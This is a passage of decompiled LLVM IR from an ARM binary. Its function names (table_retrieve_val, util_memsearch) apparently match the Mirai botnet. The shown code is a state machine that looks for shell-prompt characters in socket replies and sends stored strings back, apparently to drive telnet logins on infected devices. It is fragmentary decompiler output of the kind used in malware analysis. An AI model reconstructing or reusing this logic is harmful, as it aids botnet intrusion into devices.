  store i1 %v7_fc1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc1c, label %dec_label_pc_ff90, label %dec_label_pc_fc54.preheader

dec_label_pc_fc54.preheader:                      ; preds = %dec_label_pc_fc1c
  %v3_fc20 = add i32 %v0_f53c, 28
  %v2_fc24 = add i32 %v3_fc20, %v3_fbf0
  store i32 %v2_fc24, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fc54

dec_label_pc_fc30:                                ; preds = %dec_label_pc_fc54
  %v1_fc30 = add i32 %v0_fc4c, -2
  %v2_fc30 = inttoptr i32 %v1_fc30 to i8*
  %v3_fc30 = load i8, i8* %v2_fc30, align 1
  %v4_fc30 = zext i8 %v3_fc30 to i32
  store i32 %v4_fc30, i32* %r2.global-to-local, align 4
  %v2_fc34 = icmp ugt i8 %v3_fc30, 61
  store i1 %v2_fc34, i1* %cpsr_c.global-to-local, align 1
  %v7_fc34 = icmp eq i8 %v3_fc30, 62
  store i1 %v7_fc34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc34, label %dec_label_pc_ff90, label %bb451

bb451:                                            ; preds = %dec_label_pc_fc30
  %v3_fc38 = icmp ugt i8 %v3_fc30, 57
  store i1 %v3_fc38, i1* %cpsr_c.global-to-local, align 1
  %v8_fc38 = icmp eq i8 %v3_fc30, 58
  store i1 %v8_fc38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fc38, label %dec_label_pc_ff90, label %dec_label_pc_fc40

dec_label_pc_fc40:                                ; preds = %bb451
  %v2_fc40 = icmp ugt i8 %v3_fc30, 35
  store i1 %v2_fc40, i1* %cpsr_c.global-to-local, align 1
  %v7_fc40 = icmp eq i8 %v3_fc30, 36
  store i1 %v7_fc40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc40, label %dec_label_pc_ff90, label %dec_label_pc_fc48

dec_label_pc_fc48:                                ; preds = %dec_label_pc_fc40
  %v2_fc48 = icmp ugt i8 %v3_fc30, 34
  store i1 %v2_fc48, i1* %cpsr_c.global-to-local, align 1
  %v7_fc48 = icmp eq i8 %v3_fc30, 35
  store i1 %v7_fc48, i1* %cpsr_z.global-to-local, align 1
  %v1_fc4c = add i32 %v0_fc4c, -1
  store i32 %v1_fc4c, i32* %r3.global-to-local, align 4
  br i1 %v7_fc48, label %dec_label_pc_ff90, label %dec_label_pc_fc54

dec_label_pc_fc54:                                ; preds = %dec_label_pc_fc54.preheader, %dec_label_pc_fc48
  %v0_fc4c = phi i32 [ %v2_fc24, %dec_label_pc_fc54.preheader ], [ %v1_fc4c, %dec_label_pc_fc48 ]
  %v0_fc54 = phi i32 [ %v1_fbf4, %dec_label_pc_fc54.preheader ], [ %v1_fc54, %dec_label_pc_fc48 ]
  %v1_fc54 = add i32 %v0_fc54, -1
  store i32 %v1_fc54, i32* %r1.global-to-local, align 4
  %v2_fc54 = icmp ne i32 %v0_fc54, 0
  store i1 %v2_fc54, i1* %cpsr_c.global-to-local, align 1
  %v7_fc54 = icmp eq i32 %v0_fc54, 1
  store i1 %v7_fc54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc54, label %dec_label_pc_fc5c, label %dec_label_pc_fc30

dec_label_pc_fc5c:                                ; preds = %dec_label_pc_fc54, %dec_label_pc_fbf0
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_fc60 = call i32 @table_unlock_val(i32 25)
  store i32 %v2_fe40, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_fc70 = call i32 @table_retrieve_val(i32 25, i32* nonnull %stack_var_-60)
  %v3_fc74 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fc70, i32* %r2.global-to-local, align 4
  %v1_fc7c = add i32 %v3_fc74, -1
  store i32 %v1_fc7c, i32* %r3.global-to-local, align 4
  %v0_fc80 = load i32, i32* @fp, align 4
  store i32 %v0_fc80, i32* %r0.global-to-local, align 4
  %v0_fc84 = load i32, i32* @r6, align 4
  %v1_fc84 = add i32 %v0_fc84, 24
  %v2_fc84 = inttoptr i32 %v1_fc84 to i32*
  %v3_fc84 = load i32, i32* %v2_fc84, align 4
  store i32 %v3_fc84, i32* %r1.global-to-local, align 4
  %v4_fc88 = call i32 @util_memsearch(i32 %v0_fc80, i32 %v3_fc84, i32 %v3_fc70, i32 %v1_fc7c)
  store i32 %v4_fc88, i32* %r0.global-to-local, align 4
  %v1_fc8c = add i32 %v4_fc88, 1
  store i32 %v1_fc8c, i32* @r8, align 4
  %v2_fc8c = icmp eq i32 %v4_fc88, -1
  store i1 %v2_fc8c, i1* %cpsr_c.global-to-local, align 1
  %v7_fc8c = icmp eq i32 %v1_fc8c, 0
  store i1 %v7_fc8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc8c, label %dec_label_pc_1023c.loopexit, label %dec_label_pc_fc9c

dec_label_pc_fc9c:                                ; preds = %dec_label_pc_fc5c
  store i32 1, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_fca0 = call i32 @table_lock_val(i32 25)
  br label %dec_label_pc_fca4

dec_label_pc_fca4:                                ; preds = %dec_label_pc_ff90, %dec_label_pc_fc9c
  %storemerge = phi i32 [ %v1_fca0, %dec_label_pc_fc9c ], [ %v1_ff98, %dec_label_pc_ff90 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v0_fca4 = load i32, i32* @r6, align 4
  %v1_fca4 = inttoptr i32 %v0_fca4 to i32*
  %v2_fca4 = load i32, i32* %v1_fca4, align 4
  store i32 %v2_fca4, i32* %r3.global-to-local, align 4
  %v1_fca8 = add i32 %v0_fca4, 4
  %v2_fca8 = inttoptr i32 %v1_fca8 to i32*
  %v3_fca8 = load i32, i32* %v2_fca8, align 4
  store i32 %v3_fca8, i32* %r0.global-to-local, align 4
  %v1_fcac = add i32 %v2_fca4, 13
  %v2_fcac = inttoptr i32 %v1_fcac to i8*
  %v3_fcac = load i8, i8* %v2_fcac, align 1
  %v4_fcac = zext i8 %v3_fcac to i32
  store i32 %v4_fcac, i32* %r2.global-to-local, align 4
  %v1_fcb0 = add i32 %v2_fca4, 4
  %v2_fcb0 = inttoptr i32 %v1_fcb0 to i32*
  %v3_fcb0 = load i32, i32* %v2_fcb0, align 4
  store i32 %v3_fcb0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fcb8 = call i32 @__libc_send(i32 %v3_fca8, i32 %v3_fcb0, i32 %v4_fcac, i32 16384)
  store i32 %v4_fcb8, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fcc0 = load i32, i32* @r6, align 4
  %v1_fcc0 = add i32 %v0_fcc0, 4
  %v2_fcc0 = inttoptr i32 %v1_fcc0 to i32*
  %v3_fcc0 = load i32, i32* %v2_fcc0, align 4
  store i32 %v3_fcc0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197a8.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_fccc = call i32 @__libc_send(i32 %v3_fcc0, i32 ptrtoint ([3 x i8]* @global_var_197a8.208 to i32), i32 2, i32 16384)
  store i32 %v4_fccc, i32* %r0.global-to-local, align 4
  store i32 5, i32* @r3, align 4
  %v1_fcd4 = load i32, i32* @r6, align 4
  %v2_fcd4 = add i32 %v1_fcd4, 12
  %v3_fcd4 = inttoptr i32 %v2_fcd4 to i32*
  store i32 5, i32* %v3_fcd4, align 4
  br label %dec_label_pc_f724

dec_label_pc_fcdc:                                ; preds = %dec_label_pc_f53c
  %v1_fcdc = add i32 %v0_f53c, 24
  %v2_fcdc = inttoptr i32 %v1_fcdc to i32*
  %v3_fcdc = load i32, i32* %v2_fcdc, align 4
  store i32 %v3_fcdc, i32* %r2.global-to-local, align 4
  %v1_fce0 = add i32 %v3_fcdc, -1
  store i32 %v1_fce0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fce4 = icmp eq i32 %v1_fce0, 0
  store i1 %v2_fce4, i1* %cpsr_z.global-to-local, align 1
  %tmp452 = icmp slt i32 %v1_fce0, 1
  br i1 %tmp452, label %dec_label_pc_f4bc.backedge.thread, label %dec_label_pc_fcec

dec_label_pc_fcec:                                ; preds = %dec_label_pc_fcdc
  %v2_fcec = add i32 %v1_fce0, %v0_f53c
  store i32 %v2_fcec, i32* %r3.global-to-local, align 4
  %v1_fcf0 = add i32 %v2_fcec, 28
  %v2_fcf0 = inttoptr i32 %v1_fcf0 to i8*
  %v3_fcf0 = load i8, i8* %v2_fcf0, align 1
  %v4_fcf0 = zext i8 %v3_fcf0 to i32
  store i32 %v4_fcf0, i32* %r3.global-to-local, align 4
  %v2_fcf4 = icmp ugt i8 %v3_fcf0, 61
  store i1 %v2_fcf4, i1* %cpsr_c.global-to-local, align 1
  %v7_fcf4 = icmp eq i8 %v3_fcf0, 62
  store i1 %v7_fcf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcf4, label %dec_label_pc_fd58, label %bb453

bb453:                                            ; preds = %dec_label_pc_fcec
  %v3_fcf8 = icmp ugt i8 %v3_fcf0, 57
  store i1 %v3_fcf8, i1* %cpsr_c.global-to-local, align 1
  %v8_fcf8 = icmp eq i8 %v3_fcf0, 58
  store i1 %v8_fcf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fcf8, label %dec_label_pc_fd58, label %dec_label_pc_fd00

dec_label_pc_fd00:                                ; preds = %bb453
  %v2_fd00 = icmp ugt i8 %v3_fcf0, 35
  store i1 %v2_fd00, i1* %cpsr_c.global-to-local, align 1
  %v7_fd00 = icmp eq i8 %v3_fcf0, 36
  store i1 %v7_fd00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd00, label %dec_label_pc_fd58, label %dec_label_pc_fd08

dec_label_pc_fd08:                                ; preds = %dec_label_pc_fd00
  %v2_fd08 = icmp ugt i8 %v3_fcf0, 34
  store i1 %v2_fd08, i1* %cpsr_c.global-to-local, align 1
  %v7_fd08 = icmp eq i8 %v3_fcf0, 35
  store i1 %v7_fd08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd08, label %dec_label_pc_fd58, label %dec_label_pc_fd10

dec_label_pc_fd10:                                ; preds = %dec_label_pc_fd08
  %v2_fd10 = icmp ugt i8 %v3_fcf0, 36
  store i1 %v2_fd10, i1* %cpsr_c.global-to-local, align 1
  %v7_fd10 = icmp eq i8 %v3_fcf0, 37
  store i1 %v7_fd10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd10, label %dec_label_pc_fd58, label %dec_label_pc_fd40.preheader

dec_label_pc_fd40.preheader:                      ; preds = %dec_label_pc_fd10
  %v3_fd14 = add i32 %v0_f53c, 28
  %v2_fd18 = add i32 %v3_fd14, %v3_fcdc
  store i32 %v2_fd18, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fd40

dec_label_pc_fd24:                                ; preds = %bb454
  %v2_fd24 = icmp ugt i8 %v3_fd48, 35
  store i1 %v2_fd24, i1* %cpsr_c.global-to-local, align 1
  %v7_fd24 = icmp eq i8 %v3_fd48, 36
  store i1 %v7_fd24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd24, label %dec_label_pc_fd58, label %dec_label_pc_fd2c

dec_label_pc_fd2c:                                ; preds = %dec_label_pc_fd24
  %v2_fd2c = icmp ugt i8 %v3_fd48, 34
  store i1 %v2_fd2c, i1* %cpsr_c.global-to-local, align 1
  %v7_fd2c = icmp eq i8 %v3_fd48, 35
  store i1 %v7_fd2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd2c, label %dec_label_pc_fd58, label %dec_label_pc_fd34

dec_label_pc_fd34:                                ; preds = %dec_label_pc_fd2c
  %v2_fd34 = icmp ugt i8 %v3_fd48, 36
  store i1 %v2_fd34, i1* %cpsr_c.global-to-local, align 1
  %v7_fd34 = icmp eq i8 %v3_fd48, 37
  store i1 %v7_fd34, i1* %cpsr_z.global-to-local, align 1
  %v1_fd38 = add i32 %v0_fd38, -1
  store i32 %v1_fd38, i32* %r3.global-to-local, align 4
  br i1 %v7_fd34, label %dec_label_pc_fd58, label %dec_label_pc_fd40

dec_label_pc_fd40:                                ; preds = %dec_label_pc_fd40.preheader, %dec_label_pc_fd34
  %v0_fd38 = phi i32 [ %v2_fd18, %dec_label_pc_fd40.preheader ], [ %v1_fd38, %dec_label_pc_fd34 ]
  %v0_fd40 = phi i32 [ %v1_fce0, %dec_label_pc_fd40.preheader ], [ %v1_fd40, %dec_label_pc_fd34 ]
  %v1_fd40 = add i32 %v0_fd40, -1
  store i32 %v1_fd40, i32* %r1.global-to-local, align 4
  %v2_fd40 = icmp ne i32 %v0_fd40, 0
  store i1 %v2_fd40, i1* %cpsr_c.global-to-local, align 1
  %v7_fd40 = icmp eq i32 %v0_fd40, 1
  store i1 %v7_fd40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd40, label %dec_label_pc_f4bc.backedge.thread565, label %dec_label_pc_fd48

dec_label_pc_fd48:                                ; preds = %dec_label_pc_fd40
  %v1_fd48 = add i32 %v0_fd38, -2
  %v2_fd48 = inttoptr i32 %v1_fd48 to i8*
  %v3_fd48 = load i8, i8* %v2_fd48, align 1
  %v4_fd48 = zext i8 %v3_fd48 to i32
  store i32 %v4_fd48, i32* %r2.global-to-local, align 4
  %v2_fd4c = icmp ugt i8 %v3_fd48, 61
  store i1 %v2_fd4c, i1* %cpsr_c.global-to-local, align 1
  %v7_fd4c = icmp eq i8 %v3_fd48, 62
  store i1 %v7_fd4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd4c, label %dec_label_pc_fd58, label %bb454

bb454:                                            ; preds = %dec_label_pc_fd48
  %v3_fd50 = icmp ugt i8 %v3_fd48, 57
  store i1 %v3_fd50, i1* %cpsr_c.global-to-local, align 1
  %v8_fd50 = icmp eq i8 %v3_fd48, 58
  store i1 %v8_fd50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fd50, label %dec_label_pc_fd58, label %dec_label_pc_fd24

dec_label_pc_fd58:                                ; preds = %dec_label_pc_fd48, %bb454, %dec_label_pc_fd34, %dec_label_pc_fd2c, %dec_label_pc_fd24, %dec_label_pc_fd10, %dec_label_pc_fcec, %dec_label_pc_fd08, %dec_label_pc_fd00, %bb453
  %v0_fd5c = phi i32 [ %v1_fce0, %dec_label_pc_fd10 ], [ %v1_fce0, %dec_label_pc_fcec ], [ %v1_fce0, %dec_label_pc_fd08 ], [ %v1_fce0, %dec_label_pc_fd00 ], [ %v1_fce0, %bb453 ], [ %v1_fd40, %dec_label_pc_fd24 ], [ %v1_fd40, %dec_label_pc_fd2c ], [ %v1_fd40, %dec_label_pc_fd34 ], [ %v1_fd40, %bb454 ], [ %v1_fd40, %dec_label_pc_fd48 ]
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_fd5c = add i32 %v0_fd5c, 1
  store i32 %v1_fd5c, i32* @r8, align 4
  %v1_fd60 = call i32 @table_unlock_val(i32 4)
  store i32 %v2_fe40, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v3_fd70 = call i32 @table_retrieve_val(i32 4, i32* nonnull %stack_var_-60)
  store i32 %v3_fd70, i32* %r0.global-to-local, align 4
  %v3_fd74 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fd74, i32* %r2.global-to-local, align 4
  store i32 %v3_fd70, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fd80 = load i32, i32* @r6, align 4
  %v1_fd80 = add i32 %v0_fd80, 4
  %v2_fd80 = inttoptr i32 %v1_fd80 to i32*
  %v3_fd80 = load i32, i32* %v2_fd80, align 4
  store i32 %v3_fd80, i32* %r0.global-to-local, align 4
  %v4_fd84 = call i32 @__libc_send(i32 %v3_fd80, i32 %v3_fd70, i32 %v3_fd74, i32 16384)
  store i32 %v4_fd84, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197a8.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fd94 = load i32, i32* @r6, align 4
  %v1_fd94 = add i32 %v0_fd94, 4
  %v2_fd94 = inttoptr i32 %v1_fd94 to i32*
  %v3_fd94 = load i32, i32* %v2_fd94, align 4
  store i32 %v3_fd94, i32* %r0.global-to-local, align 4
  %v4_fd98 = call i32 @__libc_send(i32 %v3_fd94, i32 ptrtoint ([3 x i8]* @global_var_197a8.208 to i32), i32 2, i32 16384)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_fda0 = call i32 @table_lock_val(i32 4)
  store i32 %v1_fda0, i32* %r0.global-to-local, align 4
  store i32 8, i32* @r3, align 4
  %v1_fda8 = load i32, i32* @r6, align 4
  %v2_fda8 = add i32 %v1_fda8, 12
  %v3_fda8 = inttoptr i32 %v2_fda8 to i32*
  store i32 8, i32* %v3_fda8, align 4
  br label %dec_label_pc_f72c

dec_label_pc_fdb0:                                ; preds = %dec_label_pc_f53c
  %v1_fdb0 = add i32 %v0_f53c, 24
  %v2_fdb0 = inttoptr i32 %v1_fdb0 to i32*
  %v3_fdb0 = load i32, i32* %v2_fdb0, align 4
  store i32 %v3_fdb0, i32* %r2.global-to-local, align 4
  %v1_fdb4 = add i32 %v3_fdb0, -1
  store i32 %v1_fdb4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fdb8 = icmp eq i32 %v1_fdb4, 0
  store i1 %v2_fdb8, i1* %cpsr_z.global-to-local, align 1
  %tmp455 = icmp slt i32 %v1_fdb4, 1
  br i1 %tmp455, label %dec_label_pc_fe2c, label %dec_label_pc_fdc0

dec_label_pc_fdc0:                                ; preds = %dec_label_pc_fdb0
  %v2_fdc0 = add i32 %v1_fdb4, %v0_f53c
  store i32 %v2_fdc0, i32* %r3.global-to-local, align 4
  %v1_fdc4 = add i32 %v2_fdc0, 28
  %v2_fdc4 = inttoptr i32 %v1_fdc4 to i8*
  %v3_fdc4 = load i8, i8* %v2_fdc4, align 1
  %v4_fdc4 = zext i8 %v3_fdc4 to i32
  store i32 %v4_fdc4, i32* %r3.global-to-local, align 4
  %v2_fdc8 = icmp ugt i8 %v3_fdc4, 61
  store i1 %v2_fdc8, i1* %cpsr_c.global-to-local, align 1
  %v7_fdc8 = icmp eq i8 %v3_fdc4, 62
  store i1 %v7_fdc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fdc8, label %dec_label_pc_ff44, label %bb456

bb456:                                            ; preds = %dec_label_pc_fdc0
  %v3_fdcc = icmp ugt i8 %v3_fdc4, 57
  store i1 %v3_fdcc, i1* %cpsr_c.global-to-local, align 1
  %v8_fdcc = icmp eq i8 %v3_fdc4, 58
  store i1 %v8_fdcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fdcc, label %dec_label_pc_ff44, label %dec_label_pc_fdd4

dec_label_pc_fdd4:                                ; preds = %bb456
  %v2_fdd4 = icmp ugt i8 %v3_fdc4, 35
  store i1 %v2_fdd4, i1* %cpsr_c.global-to-local, align 1
  %v7_fdd4 = icmp eq i8 %v3_fdc4, 36
  store i1 %v7_fdd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fdd4, label %dec_label_pc_ff44, label %dec_label_pc_fddc

dec_label_pc_fddc:                                ; preds = %dec_label_pc_fdd4
  %v2_fddc = icmp ugt i8 %v3_fdc4, 34
  store i1 %v2_fddc, i1* %cpsr_c.global-to-local, align 1
  %v7_fddc = icmp eq i8 %v3_fdc4, 35
  store i1 %v7_fddc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fddc, label %dec_label_pc_ff44, label %dec_label_pc_fde4

dec_label_pc_fde4:                                ; preds = %dec_label_pc_fddc
  %v2_fde4 = icmp ugt i8 %v3_fdc4, 36
  store i1 %v2_fde4, i1* %cpsr_c.global-to-local, align 1
  %v7_fde4 = icmp eq i8 %v3_fdc4, 37
  store i1 %v7_fde4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fde4, label %dec_label_pc_ff44, label %dec_label_pc_fe24.preheader

dec_label_pc_fe24.preheader:                      ; preds = %dec_label_pc_fde4
  %v3_fde8 = add i32 %v0_f53c, 28
  %v2_fdec = add i32 %v3_fde8, %v3_fdb0
  store i32 %v2_fdec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fe24

dec_label_pc_fdf8:                                ; preds = %dec_label_pc_fe24
  %v1_fdf8 = add i32 %v0_fe1c, -2
  %v2_fdf8 = inttoptr i32 %v1_fdf8 to i8*
  %v3_fdf8 = load i8, i8* %v2_fdf8, align 1
  %v4_fdf8 = zext i8 %v3_fdf8 to i32
  store i32 %v4_fdf8, i32* %r2.global-to-local, align 4
  %v2_fdfc = icmp ugt i8 %v3_fdf8, 61
  store i1 %v2_fdfc, i1* %cpsr_c.global-to-local, align 1
  %v7_fdfc = icmp eq i8 %v3_fdf8, 62
  store i1 %v7_fdfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fdfc, label %dec_label_pc_ff44, label %bb457

bb457:                                            ; preds = %dec_label_pc_fdf8
  %v3_fe00 = icmp ugt i8 %v3_fdf8, 57
  store i1 %v3_fe00, i1* %cpsr_c.global-to-local, align 1
  %v8_fe00 = icmp eq i8 %v3_fdf8, 58
  store i1 %v8_fe00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fe00, label %dec_label_pc_ff44, label %dec_label_pc_fe08

dec_label_pc_fe08:                                ; preds = %bb457
  %v2_fe08 = icmp ugt i8 %v3_fdf8, 35
  store i1 %v2_fe08, i1* %cpsr_c.global-to-local, align 1
  %v7_fe08 = icmp eq i8 %v3_fdf8, 36
  store i1 %v7_fe08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe08, label %dec_label_pc_ff44, label %dec_label_pc_fe10

dec_label_pc_fe10:                                ; preds = %dec_label_pc_fe08
  %v2_fe10 = icmp ugt i8 %v3_fdf8, 34
  store i1 %v2_fe10, i1* %cpsr_c.global-to-local, align 1
  %v7_fe10 = icmp eq i8 %v3_fdf8, 35
  store i1 %v7_fe10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe10, label %dec_label_pc_ff44, label %dec_label_pc_fe18

dec_label_pc_fe18:                                ; preds = %dec_label_pc_fe10
  %v2_fe18 = icmp ugt i8 %v3_fdf8, 36
  store i1 %v2_fe18, i1* %cpsr_c.global-to-local, align 1
  %v7_fe18 = icmp eq i8 %v3_fdf8, 37
  store i1 %v7_fe18, i1* %cpsr_z.global-to-local, align 1
  %v1_fe1c = add i32 %v0_fe1c, -1
  store i32 %v1_fe1c, i32* %r3.global-to-local, align 4
  br i1 %v7_fe18, label %dec_label_pc_ff44, label %dec_label_pc_fe24

dec_label_pc_fe24:                                ; preds = %dec_label_pc_fe24.preheader, %dec_label_pc_fe18
  %v0_fe1c = phi i32 [ %v2_fdec, %dec_label_pc_fe24.preheader ], [ %v1_fe1c, %dec_label_pc_fe18 ]
  %v0_fe24 = phi i32 [ %v1_fdb4, %dec_label_pc_fe24.preheader ], [ %v1_fe24, %dec_label_pc_fe18 ]
  %v1_fe24 = add i32 %v0_fe24, -1
  store i32 %v1_fe24, i32* %r1.global-to-local, align 4
  %v2_fe24 = icmp ne i32 %v0_fe24, 0
  store i1 %v2_fe24, i1* %cpsr_c.global-to-local, align 1
  %v7_fe24 = icmp eq i32 %v0_fe24, 1
  store i1 %v7_fe24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe24, label %dec_label_pc_fe2c, label %dec_label_pc_fdf8

dec_label_pc_fe2c:                                ; preds = %dec_label_pc_fe24, %dec_label_pc_fdb0
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_fe30 = call i32 @table_unlock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_fe38 = call i32 @table_unlock_val(i32 27)
  store i32 %v2_fe40, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_fe48 = call i32 @table_retrieve_val(i32 26, i32* nonnull %stack_var_-60)
  store i32 %v3_fe48, i32* @r4, align 4
  store i32 %v2_fe40, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_fe5c = call i32 @table_retrieve_val(i32 27, i32* nonnull %stack_var_-60)
  %v3_fe60 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fe5c, i32* @r5, align 4
  %v0_fe68 = load i32, i32* @r4, align 4
  store i32 %v0_fe68, i32* %r2.global-to-local, align 4
  %v1_fe6c = add i32 %v3_fe60, -1
  store i32 %v1_fe6c, i32* %r3.global-to-local, align 4
  %v0_fe70 = load i32, i32* @fp, align 4
  store i32 %v0_fe70, i32* %r0.global-to-local, align 4
  %v0_fe74 = load i32, i32* @r6, align 4
  %v1_fe74 = add i32 %v0_fe74, 24
  %v2_fe74 = inttoptr i32 %v1_fe74 to i32*
  %v3_fe74 = load i32, i32* %v2_fe74, align 4
  store i32 %v3_fe74, i32* %r1.global-to-local, align 4
  %v4_fe78 = call i32 @util_memsearch(i32 %v0_fe70, i32 %v3_fe74, i32 %v0_fe68, i32 %v1_fe6c)
  store i32 %v4_fe78, i32* %r0.global-to-local, align 4
  %v2_fe7c = icmp eq i32 %v4_fe78, -1
  store i1 %v2_fe7c, i1* %cpsr_c.global-to-local, align 1
  %v7_fe7c = icmp eq i32 %v4_fe78, -1
  store i1 %v7_fe7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe7c, label %dec_label_pc_fe8c, label %dec_label_pc_feb4

dec_label_pc_fe8c:                                ; preds = %dec_label_pc_fe2c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_fe8c = load i32, i32* %stack_var_-60, align 4
  %v0_fe90 = load i32, i32* @r5, align 4
  store i32 %v0_fe90, i32* %r2.global-to-local, align 4
  %v1_fe94 = add i32 %v3_fe8c, -1
  store i32 %v1_fe94, i32* %r3.global-to-local, align 4
  %v0_fe98 = load i32, i32* @fp, align 4
  store i32 %v0_fe98, i32* %r0.global-to-local, align 4
  %v0_fe9c = load i32, i32* @r6, align 4
  %v1_fe9c = add i32 %v0_fe9c, 24
  %v2_fe9c = inttoptr i32 %v1_fe9c to i32*
  %v3_fe9c = load i32, i32* %v2_fe9c, align 4
  store i32 %v3_fe9c, i32* %r1.global-to-local, align 4
  %v4_fea0 = call i32 @util_memsearch(i32 %v0_fe98, i32 %v3_fe9c, i32 %v0_fe90, i32 %v1_fe94)
  store i32 %v4_fea0, i32* %r0.global-to-local, align 4
  %v1_fea4 = add i32 %v4_fea0, 1
  store i32 %v1_fea4, i32* @r8, align 4
  %v2_fea4 = icmp eq i32 %v4_fea0, -1
  store i1 %v2_fea4, i1* %cpsr_c.global-to-local, align 1
  %v7_fea4 = icmp eq i32 %v1_fea4, 0
  store i1 %v7_fea4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fea4, label %dec_label_pc_1024c, label %dec_label_pc_feb4

dec_label_pc_feb4:                                ; preds = %dec_label_pc_fe8c, %dec_label_pc_fe2c
  store i32 1, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_feb8 = call i32 @table_lock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_fec0 = call i32 @table_lock_val(i32 27)
  store i32 %v1_fec0, i32* %r0.global-to-local, align 4
  %v0_fec4 = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fec4 = icmp eq i32 %v0_fec4, 0
  store i1 %v2_fec4, i1* %cpsr_z.global-to-local, align 1
  %tmp458 = icmp slt i32 %v0_fec4, 1
  br i1 %tmp458, label %dec_label_pc_f724, label %dec_label_pc_ff58

dec_label_pc_fed0:                                ; preds = %dec_label_pc_f86c
  store i32 %v2_fed4, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_197b4.210 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_fed4, i32* @r0, align 4
  store i32 %v2_fee8, i32* @sl, align 4
  %v0_feec = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_fee8, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_197ab.212 to i32), i32* @r1, align 4
  %v0_fefc = call i32 @memcpy()
  store i32 %v0_fefc, i32* %r0.global-to-local, align 4
  %v0_ff00 = load i32, i32* @r6, align 4
  %v1_ff00 = add i32 %v0_ff00, 24
  %v2_ff00 = inttoptr i32 %v1_ff00 to i32*
  %v3_ff00 = load i32, i32* %v2_ff00, align 4
  %v0_ff04 = load i32, i32* @r4, align 4
  %v1_ff04 = add i32 %v0_ff04, 2
  store i32 %v1_ff04, i32* %r2.global-to-local, align 4
  %v0_ff08 = load i32, i32* @fp, align 4
  %v2_ff08 = add i32 %v0_ff08, %v3_ff00
  store i32 %v2_ff08, i32* @r3, align 4
  %v3_ff0c = icmp uge i32 %v2_ff08, %v1_ff04
  store i1 %v3_ff0c, i1* %cpsr_c.global-to-local, align 1
  %v9_ff0c = icmp eq i32 %v2_ff08, %v1_ff04
  store i1 %v9_ff0c, i1* %cpsr_z.global-to-local, align 1
  %v2_ff10 = xor i1 %v3_ff0c, true
  %v3_ff10 = or i1 %v9_ff0c, %v2_ff10
